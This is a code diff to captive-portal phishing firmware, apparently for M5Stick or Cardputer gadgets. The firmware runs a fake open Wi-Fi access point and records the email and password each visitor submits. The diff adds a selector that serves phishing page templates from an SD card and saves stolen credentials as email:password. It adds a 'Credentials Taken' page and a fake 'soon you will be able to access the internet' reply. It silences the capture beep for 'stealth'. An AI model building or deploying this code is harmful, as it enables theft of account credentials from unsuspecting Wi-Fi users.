@@ -3,11 +3,9 @@
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-//#define DEFAULT_AP_SSID_NAME "WiFi Gratis"
-
 //TODO: list templates from SD and make select menu
 
-#define SD_CREDS_PATH "/nemo-portal-creds.txt"
+#define SD_CREDS_PATH "/evil-portal-creds.txt"
 
 #if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
 #error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR"
@@ -37,6 +35,7 @@
 int totalCapturedCredentials = 0;
 int previousTotalCapturedCredentials = 0;
 String capturedCredentialsHtml = "";
+String selectedTemplate;
 //String apSsidName = String(DEFAULT_AP_SSID_NAME);
 
 // Init System Settings
@@ -54,7 +53,7 @@ void setupWiFi(String apSsidName) {
   WiFi.softAP(apSsidName);
 }
 
-void printHomeToScreen(String apSsidName) {
+void printHomeToScreen(String apSsidName, String selectedTemplate) {
   DISP.fillScreen(BLACK);
   DISP.setSwapBytes(true);
   DISP.setTextSize(2);
@@ -69,6 +68,10 @@ void printHomeToScreen(String apSsidName) {
   DISP.print(apSsidName);
   DISP.println("");
   DISP.printf("Victim Count: %d\n", totalCapturedCredentials);
+  // fancy output xd
+    int htmlPosition = selectedTemplate.indexOf(".html");
+    String resultString = selectedTemplate.substring(0, htmlPosition);
+  DISP.printf("Template: %s\n", resultString);
 }
 
 String getInputValue(String argName) {
@@ -108,7 +111,26 @@ String getHtmlContents(String body) {
 }
 
 String creds_GET() {
-  return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
+    String credsResponse =
+    "<!DOCTYPE html>"
+    "<html>"
+    "<head>"
+    "  <title>Creds</title>"
+    "  <meta charset='UTF-8'>"
+    "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+    "  <style>.st0{fill:#2864AE;}	.st1{fill:#48AD45;} .st2{fill:#FABD14;} a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ align-items: center; background-size: auto;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
+    "</head>"
+    "<body>"
+    "  <div class='container'>"
+    "    <div class='logo-container'>"
+    "      <?xml version='1.0' standalone='no'?>"
+    " <h1>Credentials Taken</h1>"
+    "    </div>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>"
+    "  </div>"
+    "</body>"
+    "</html>";
+    return credsResponse;
+  //return getHtmlContents("<ol>" + capturedCredentialsHtml + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>");
 }
 
 String index_GET() {
@@ -128,9 +150,27 @@ String index_POST() {
   capturedCredentialsHtml = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + capturedCredentialsHtml;
 
 #if defined(SDCARD)
-  appendToFile(SD, SD_CREDS_PATH, String(email + " = " + password).c_str());
+  appendToFile(SD, SD_CREDS_PATH, String(email + ":" + password).c_str());
 #endif
-  return getHtmlContents(LOGIN_AFTER_MESSAGE);
+  String finalResponse =
+    "<!DOCTYPE html>"
+    "<html>"
+    "<head>"
+    "  <title>Redirecting...</title>"
+    "  <meta charset='UTF-8'>"
+    "  <meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+    "  <style>.st0{fill:#2864AE;}	.st1{fill:#48AD45;} .st2{fill:#FABD14;} a:hover{ text-decoration: underline;} body{ font-family: Arial, sans-serif; align-items: center; justify-content: center; background-color: #FFFFFF;} input[type='text'], input[type='password']{ width: 100%; padding: 12px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #cccccc; border-radius: 4px;} .container{ margin: auto; padding: 20px;} .logo-container{ text-align: center; margin-bottom: 30px; display: flex; justify-content: center; align-items: center;} .logo{ width: 40px; height: 40px; fill: #FFC72C; margin-right: 100px;} .company-name{ font-size: 42px; color: black; margin-left: 0px;} .form-container{ background: #FFFFFF; border: 1px solid #CEC0DE; border-radius: 4px; padding: 20px; box-shadow: 0px 0px 10px 0px rgba(108, 66, 156, 0.2);} h1{ text-align: center; font-size: 28px; font-weight: 500; margin-bottom: 20px;} .input-field{ width: 100%; padding: 12px; border: 1px solid #BEABD3; border-radius: 4px; margin-bottom: 20px; font-size: 14px;} .submit-btn{ background: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-size: 16px;} .submit-btn:hover{ background: #5B3784;} .containerlogo{ align-items: center; background-size: auto;} .containertitle{ color: #202124; font-size: 24px; padding: 15px 0px 10px 0px;} .containersubtitle{ color: #202124; font-size: 16px; padding: 0px 0px 30px 0px;} .containermsg{ padding: 30px 0px 0px 0px; color: #5f6368;} .containerbtn{ padding: 30px 0px 25px 0px;} @media screen and (min-width: 768px){ .logo{ max-width: 80px; max-height: 80px;}} </style>"
+    "</head>"
+    "<body>"
+    "  <div class='container'>"
+    "    <div class='logo-container'>"
+    "      <?xml version='1.0' standalone='no'?>"
+    " <h1>Please wait a few minutes. Soon you will be able to access the internet.</h1>"
+    "    </div>"
+    "  </div>"
+    "</body>"
+    "</html>";
+  return finalResponse;
 }
 
 String clear_GET() {
@@ -138,7 +178,8 @@ String clear_GET() {
   String password = "<p></p>";
   capturedCredentialsHtml = "<p></p>";
   totalCapturedCredentials = 0;
-  return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
+  return "<div><h1>The credentials list has been reset.</div></h1><br><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a><br><a style=\"color:blue\" href=/>Back to Index</a>";
+  //return getHtmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to capturedCredentialsHtml</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
 }
 
 #if defined(M5LED)
@@ -161,17 +202,23 @@ void setupWebServer() {
   webServer.on("/post", []() {
     totalCapturedCredentials = totalCapturedCredentials + 1;
     webServer.send(HTTP_CODE, "text/html", index_POST());
+
+/* stealth :)
 #if defined(STICK_C_PLUS) || defined(STICK_C) || defined(STICK_C_PLUS2)
-    SPEAKER.tone(4000);
-    delay(50);
-    SPEAKER.mute();
+    //SPEAKER.tone(4000);
+    //delay(50);
+    //SPEAKER.mute();
 #elif defined(CARDPUTER)
-    SPEAKER.tone(4000, 50);
+    //SPEAKER.tone(4000, 50);
 #endif
+*/
+    DISP.setTextColor(GREEN, BGCOLOR);
+    DISP.setTextSize(3);
     DISP.print("Victim Login");
-#if defined(CARDPUTER)
-    M5Cardputer.Speaker.tone(10000, 100);
-#endif
+    DISP.setTextColor(FGCOLOR, BGCOLOR);
+    DISP.setTextSize(2);
+    delay(1000);
+
 #if defined(M5LED)
     blinkLed();
     
@@ -188,7 +235,20 @@ void setupWebServer() {
   Serial.println("Registering /*");
   webServer.onNotFound([]() {
     lastActivity = millis();
+
+    // Template select
+    if (selectedTemplate == NULL){
     webServer.send(HTTP_CODE, "text/html", index_GET());
+    } else {
+
+      File payloadFile = SD.open("/" + selectedTemplate, "r");
+      String fileContent = "";
+      while (payloadFile.available()) {
+        fileContent += (char)payloadFile.read();
+      }
+      webServer.send(HTTP_CODE, "text/html", fileContent);
+
+    }
   });
   Serial.println("Starting Webserver");
   webServer.begin();
